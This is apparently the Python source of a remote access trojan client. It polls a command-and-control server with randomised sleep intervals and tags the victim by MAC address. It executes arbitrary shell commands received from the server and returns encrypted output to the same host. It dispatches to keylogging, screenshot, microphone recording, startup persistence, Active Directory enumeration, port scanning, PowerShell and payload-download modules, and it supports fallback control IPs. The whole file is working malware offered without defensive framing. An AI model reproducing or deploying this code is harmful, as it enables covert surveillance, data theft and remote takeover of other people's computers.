import subprocess
import random
import time
import uuid
import requests

from constants import CONTROL
import pyutils.ad_utils as ad
import pyutils.audio as a
import pyutils.downloader as d
import pyutils.encryption_utils as eu
import pyutils.file_handling as fh
import pyutils.keylogger_handler as kh
import pyutils.local_utils as lu
import pyutils.network_utils as nu
import pyutils.powershell_utils as pu
import pyutils.screenshot_handling as sh
import pyutils.process_killer as k

Buffer = 2
Interval = 10
Ips = [CONTROL]

def handle_base_command(message):
        try:
            response = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = response.communicate()
            if error: response = error.decode()
            else: response = output.decode()
        except Exception as e:
            response = e
        return response

def set_buffer(message):
    try:
        global Buffer
        Buffer = int(message.split(" ")[1].strip())
    except Exception as e: return e

    return f"Successfully set the buffer to {Buffer}"

def set_interval(message):
    try:
        global Interval
        Interval = int(message.split(" ")[1])
    except Exception as e: return e

    return f"Successfully set the interval to {Interval}"

def get_mac():
    mac = uuid.getnode()
    address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
    return address

def get_sleep_time():
    return random.randint((Interval-Buffer) * 100, (Interval+Buffer)*100) / 100

def add_ip(message):
    ip = message.split(" ")[1]
    Ips.append(ip)
    return f"Added IP. Current IP pool: {Ips}"

def handle_input(message: str):
    command_handlers = {
        "cd": fh.handle_cd,
        "ls": fh.listdir_handler,
        "pwd": fh.pwd,
        "mkdir": fh.handle_mkdir,
        "get-users": ad.get_users,
        "set-buffer": set_buffer,
        "set-interval": set_interval,
        "powershell": pu.powershell,
        "scan-ports": nu.scan_ports,
        "keylogger": kh.handle_keylogger,
        "add-to-startup-1": lu.add_to_startup_1,
        "add-to-startup-2": lu.add_to_startup_2,
        "screenshot": sh.handle_screenshot,
        "audio-record": a.handle_mic,
        "get-processes": lu.processes,
        "downloader": d.downloader,
        "kill": k.kill_process,
        "ip-add": add_ip
    }

    for prefix, handler in command_handlers.items():
        if message.startswith(prefix):
            return handler(message)

    return handle_base_command(message)

def get_new_ip(ip):
    i = Ips.index(ip)
    if len(Ips) >= i+2:
        return Ips[i+1]
    return ip

def start_server():
    ip = CONTROL
    error_count = 0
    mac = get_mac()
    while True:
        time.sleep(get_sleep_time())

        try:
            headers = {'X-MAC-Address': mac}
            r = requests.get(ip, headers=headers)
            error_count = 0
        except Exception as e:
            if error_count == 3:
                error_count = 0
                ip = get_new_ip(ip)
                continue
            print(e)
            error_count += 1
            continue

        if r.status_code == 200:
            cmds = r.content.decode().split("\n")
            if len(cmds[0]) > 1:
                for cmd in cmds:

                    try:
                        txt = f"{cmd}\n{handle_input(cmd)}"
                    except Exception as e:
                        txt = str(e)

                    txt = eu.encrypt1(f"{mac}\n{txt}")
                    headers = {'Content-Type': 'text/plain'}
                    r2 = requests.post(ip, data=txt, headers=headers)
                    if r2.status_code == 200: print(f"Successfully sent response for {cmd}")

if __name__ == '__main__':
    start_server()
